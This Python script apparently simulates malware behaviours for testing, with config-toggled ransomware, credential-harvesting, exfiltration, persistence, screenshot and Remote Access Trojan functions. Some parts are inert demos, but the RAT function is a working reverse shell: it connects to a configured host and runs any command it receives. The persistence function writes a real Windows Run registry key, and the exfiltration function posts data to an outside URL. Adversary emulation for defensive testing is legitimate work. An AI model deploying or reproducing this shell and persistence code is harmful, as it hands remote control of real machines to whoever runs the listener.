import os
import json
import requests
from cryptography.fernet import Fernet
from PIL import ImageGrab
import socket
import subprocess
from utils import log_event

def simulate_file_operations(config):
    log_event("Simulating file operations")
    directory = "temp_simulation"
    os.makedirs(directory, exist_ok=True)

    file_path = os.path.join(directory, "malware_test.txt")
    with open(file_path, "w") as f:
        f.write("This is a simulated malware file.")
    log_event(f"Created file: {file_path}")

    if config.get("delete_file_after_creation", False):
        os.remove(file_path)
        log_event(f"Deleted file: {file_path}")


def simulate_registry_operations(config):
    log_event("Simulating registry operations")
    if os.name != "nt":
        log_event("Registry simulation is Windows-only.")
        return

    try:
        import winreg
        key = r"SOFTWARE\SafeSim"
        value_name = "TestKey"
        value_data = "SimulatedRegistryData"

        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, value_data)
        log_event(f"Created registry key: {key}\\{value_name} -> {value_data}")
    except Exception as e:
        log_event(f"Registry simulation error: {e}")


def simulate_network_traffic(config):
    log_event("Simulating network traffic")
    url = config["network_traffic"]["url"]
    try:
        response = requests.get(url)
        log_event(f"HTTP GET Request to {url} | Status Code: {response.status_code}")
    except Exception as e:
        log_event(f"Network traffic simulation error: {e}")


def simulate_ransomware(config):
    log_event("Simulating ransomware behavior")
    directory = config["ransomware_simulation"]["target_directory"]
    os.makedirs(directory, exist_ok=True)

    key = Fernet.generate_key()
    cipher = Fernet(key)

    file_paths = []
    for i in range(3):
        file_path = os.path.join(directory, f"file_{i}.txt")
        with open(file_path, "w") as f:
            f.write("This is a test file for ransomware simulation.")
        file_paths.append(file_path)

    for file_path in file_paths:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
        log_event(f"Encrypted file: {file_path}")

    ransom_message = "Your files have been encrypted. Pay 1 Bitcoin to decrypt them."
    log_event(f"Ransomware message: {ransom_message}")


def simulate_credential_harvesting(config):
    log_event("Simulating credential harvesting")
    fake_credentials = {
        "example.com": {"username": "user1", "password": "password123"},
        "bank.com": {"username": "john_doe", "password": "securepass!"},
    }

    for site, creds in fake_credentials.items():
        log_event(f"Harvested credentials from {site}: {creds['username']} | {creds['password']}")


def simulate_data_exfiltration(config):
    log_event("Simulating data exfiltration")
    sensitive_data = "This is sensitive data being exfiltrated."
    target_url = config["data_exfiltration"]["target_url"]

    try:
        response = requests.post(target_url, data={"data": sensitive_data})
        log_event(f"Data exfiltrated to {target_url} | Status Code: {response.status_code}")
    except Exception as e:
        log_event(f"Data exfiltration failed: {e}")


def simulate_persistence(config):
    log_event("Simulating persistence mechanism")
    if os.name != "nt":
        log_event("Persistence simulation is Windows-only.")
        return

    try:
        import winreg
        startup_path = os.path.abspath("safe_sim.py")
        key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SafeSimPersistence"

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, startup_path)
        log_event(f"Added persistence: {value_name} -> {startup_path}")
    except Exception as e:
        log_event(f"Persistence simulation error: {e}")


def simulate_rat(config):
    log_event("Simulating Remote Access Trojan (RAT)")
    host = config["rat_simulation"]["host"]
    port = config["rat_simulation"]["port"]

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            log_event(f"Connected to remote host: {host}:{port}")
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    log_event("RAT session terminated by remote host")
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
    except Exception as e:
        log_event(f"RAT simulation error: {e}")


def simulate_screenshot_capture(config):
    log_event("Simulating screenshot capture")
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "screenshot_simulation.png"
        screenshot.save(screenshot_path)
        log_event(f"Screenshot captured and saved: {screenshot_path}")
    except Exception as e:
        log_event(f"Screenshot capture failed: {e}")


if __name__ == "__main__":
    with open("config.json") as f:
        config = json.load(f)

    if config.get("simulate_file_operations", False):
        simulate_file_operations(config)
    if config.get("simulate_registry_operations", False):
        simulate_registry_operations(config)
    if config.get("simulate_network_traffic", False):
        simulate_network_traffic(config)
    if config.get("simulate_ransomware", False):
        simulate_ransomware(config)
    if config.get("simulate_credential_harvesting", False):
        simulate_credential_harvesting(config)
    if config.get("simulate_data_exfiltration", False):
        simulate_data_exfiltration(config)
    if config.get("simulate_persistence", False):
        simulate_persistence(config)
    if config.get("simulate_rat", False):
        simulate_rat(config)
    if config.get("simulate_screenshot_capture", False):
        simulate_screenshot_capture(config)
